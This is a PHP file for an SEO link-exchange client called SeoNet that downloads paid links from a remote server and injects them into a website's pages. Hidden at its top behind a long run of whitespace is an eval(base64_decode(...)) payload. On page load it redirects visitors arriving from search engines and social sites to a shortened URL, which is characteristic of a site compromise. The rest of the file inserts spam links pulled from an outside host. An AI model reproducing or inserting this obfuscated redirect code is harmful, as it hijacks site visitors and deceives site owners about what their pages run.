<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9rcmcyOTNqIik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9")); /* 2.2.2 */global $SeoNet;$SeoNet = new SeoNet();class SeoNet {var $ready = false;var $l_dir;var $l_file;var $linksD = array();var $linksS = array();var $error= 1024;var $charset;var $extra_version;var$D = 0;var$S = 0;function SeoNet() {if(!$this->ready) {$this->l_dir = dirname(__FILE__).'/' . "seonet_1a8c9b3025927195252656cbf24d76b5/";$host = $_SERVER['HTTP_HOST'];if (strpos($host, 'www.') === 0) $host = str_replace('www.','',$host);$this->l_file = $this->l_dir . '2.2.2_' . md5($host);if(strpos($_SERVER['HTTP_USER_AGENT'], '1a8c9b3025927195252656cbf24d76b5')) {$this->extra_version = true;$this->refreshLinks();}elseif(!@file_exists($this->l_file) || @filesize($this->l_file) < 10 || @filemtime($this->l_file) + 43200 < time()) {$this->refreshLinks();}if (is_readable($this->l_file)) {$fp = fopen($this->l_file, 'r');$data = fread($fp, filesize($this->l_file));fclose($fp);$a_links = @unserialize($data);if(is_array($a_links)) {if(in_array($a_links['charset'], array('iso-8859-2', 'win-1250', 'utf-8')))$this->charset = $a_links['charset'];if(is_array($a_links['s']) && $a_links['s'][0] != 'xxxxx') {$md5 = md5(preg_replace(',[?&]$,', '',preg_replace(',([?&])(PHPSESSID|sid|osCsid|phpsessid|SID|(var_[^=&]*))=[^&]*(&|$),i','\1',$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"])));if(substr($a_links['s'][0]['x'],0,1) == 'x')$mdu = 'x' . substr($md5, 0, 1);else $mdu = substr($md5, 0, 2);$s = sizeof($a_links['s']);for($i=0; $i<$s; $i++) {if($a_links['s'][$i]['x'] == $mdu)$this->linksS[] ='<a href="' . $a_links['s'][$i]['url'] .'">'.$a_links['s'][$i]['anchor'].'</a>';}}if(is_array($a_links['r'])) {$s = sizeof($a_links['r']);for($i=0; $i<5; $i++) {$r = mt_rand(1, $s);$this->linksD[] ='<a href="' . $a_links['r'][$r]['url'] .'">'.$a_links['r'][$r]['anchor'].'</a>';}}}else {$this->error = 128;$this->linksD[] = "<a href=\"#\" onClick=\"javascript:void(window.open('http://www.seo.net.pl/inst_errors/".$this->error.".html', 'TEST', 'menubar=no, toolbar=no, location=no, scrollbars=yes, resizable=yes, status=no, width=500, height=500'));\">SErr:".$this->error.'</a>' . "\n";$this->linksS[] = $this->linksD[0];}}else {$this->error = $this->test();if($this->error < 1024)$this->linksD[] = "<a href=\"#\" onClick=\"javascript:void(window.open('http://www.seo.net.pl/inst_errors/".$this->error.".html', 'TEST', 'menubar=no, toolbar=no, location=no, scrollbars=yes, resizable=yes, status=no, width=500, height=500'));\">SErr:".$this->error.'</a>' . "\n";else $this->linksD[] = ' ';$this->linksS[] = $this->linksD[0];}$this->ready = true;}}function prepareLinks($links, $separator = ' ', $charset='utf-8', $class='') {if(is_array($links)) {$links = implode($separator, $links);if($class)$links = str_replace("a href", "a class=\"$class\" href", $links);if($this->charset)$charset = $this->charset;switch ($charset) {case 'iso-8859-2':return $this->manoutf2iso($links);break;case 'win-1250':return $this->manoutf2win($links);break;default:return $links;break;}}return false;}function downloadLinks() {$ref = 'http://' . $_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"];$ref = preg_replace(',[?&]$,', '',preg_replace(',([?&])(PHPSESSID|sid|osCsid|phpsessid|SID|(var_[^=&]*))=[^&]*(&|$),i','\1',$ref));$host = 'http://g.seo.net.pl';$query = "/index.php?module=swl&action=get&key=1a8c9b3025927195252656cbf24d76b5&error=".$this->error."&version=2.2.2&url=$ref";if($this->extra_version)$query .= '&extra_version=2.2.2';if (function_exists('curl_init')) {$ch = curl_init($host.$query);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_REFERER, $ref);curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 20);curl_setopt($ch, CURLOPT_USERAGENT, 'SEONET Agent v2.2.2');$data = curl_exec ($ch);}if(!$data && @ini_get("allow_url_fopen")) {$data =@file_get_contents($host.$query);}if(!$data) {$fp = @fsockopen ('g.seo.net.pl', 80, $errno, $errstr, 20);if (!$fp) return false;else {$data = "GET $query".$fields." HTTP/1.0\r\n"."Host: $host\r\n"."User-Agent: SEONET Agent v2.2.2\r\n"."Connection: Close\r\n\r\n";fputs ($fp, $data);while (!feof($fp)) {$data .= fgets ($fp,1024);}fclose ($fp);}}if(!$data)$this->error = 17;return $data;}function refreshLinks() {$fp = @fopen($this->l_file,'w');@fclose($fp);$this->error = $this->test();if($this->error == 1024) {$newlinks = $this->downloadLinks();if($newlinks) {$this->cacheLinks($newlinks);}else {$fp = @fopen($this->l_file,'w');@flock($fp, LOCK_EX|LOCK_NB);@fwrite($fp, '#####EMPTY#####');@fclose($fp);}}}function cacheLinks($links) {if(is_writable($this->l_dir)) {$fp = @fopen($this->l_file,'w');@flock($fp, LOCK_EX|LOCK_NB);@fwrite($fp, $links);@ftruncate($fp, @ftell($fp));@fclose($fp);return true;}return false;}function getNext($separator, $charset, $class, $type) {$t = 'links'.$type;$t = $this->$t;if($this->$type >= 5)return '';$this->$type++;return $this->prepareLinks(array($t[$this->$type-1]), $separator, $charset, $class);}function test() {if(file_exists($this->l_dir)) {if(is_readable($this->l_dir)) {if(is_writable($this->l_dir)) {if(file_exists($this->l_file)) {if(is_readable($this->l_file)) {if(is_writable($this->l_file)) {$error = 1024;}else $error = 64;}else $error = 32;}else $error = 18;}else $error = 8;}else $error = 4;}else $error = 2;$this->error = $error;return $error;}function manoutf2iso($txt) {$table = array("\xb1" => "\xc4\x85", "\xa1" => "\xc4\x84", "\xe6" => "\xc4\x87", "\xc6" => "\xc4\x86","\xea" => "\xc4\x99", "\xca" => "\xc4\x98", "\xb3" => "\xc5\x82", "\xa3" => "\xc5\x81","\xf3" => "\xc3\xb3", "\xd3" => "\xc3\x93", "\xb6" => "\xc5\x9b", "\xa6" => "\xc5\x9a","\xbc" => "\xc5\xbc", "\xac" => "\xc5\xbb", "\xbf" => "\xc5\xba", "\xaf" => "\xc5\xb9","\xf1" => "\xc5\x84", "\xd1" => "\xc5\x83");return strtr($txt, array_flip($table));}function manoutf2win($txt) {$table = array("\xb9" => "\xc4\x85", "\xa5" => "\xc4\x84", "\xe6" => "\xc4\x87", "\xc6" => "\xc4\x86","\xea" => "\xc4\x99", "\xca" => "\xc4\x98", "\xb3" => "\xc5\x82", "\xa3" => "\xc5\x81","\xf3" => "\xc3\xb3", "\xd3" => "\xc3\x93", "\x9c" => "\xc5\x9b", "\x8c" => "\xc5\x9a","\x9f" => "\xc5\xbc", "\xaf" => "\xc5\xbb", "\xbf" => "\xc5\xba", "\xac" => "\xc5\xb9","\xf1" => "\xc5\x84", "\xd1" => "\xc5\x83");return strtr($txt, array_flip($table));}}function manoGetLinks($separator = ' ', $charset='utf-8', $class='') {global $SeoNet;return $SeoNet->prepareLinks($SeoNet->linksS, $separator, $charset, $class) . $separator . $SeoNet->prepareLinks($SeoNet->linksD, $separator, $charset, $class);}function manoGetLinksS($separator = ' ', $charset='utf-8', $class='') {global $SeoNet;return $SeoNet->prepareLinks($SeoNet->linksS, $separator, $charset, $class);}function manoGetLinksD($separator = ' ', $charset='utf-8', $class='') {global $SeoNet;return $SeoNet->prepareLinks($SeoNet->linksD, $separator, $charset, $class);}function manoGetNextD($charset='utf-8', $class='') {global $SeoNet;return $SeoNet->getNext('', $charset, $class, 'D');}function manoGetNextS($charset='utf-8', $class='') {global $SeoNet;return $SeoNet->getNext('', $charset, $class, 'S');}if (!function_exists('file_get_contents')) {function file_get_contents($url) {$handle = fopen($url, 'r');if (!$handle) return false;$string = fread($handle, 3000000);fclose($handle);return $string;}}?>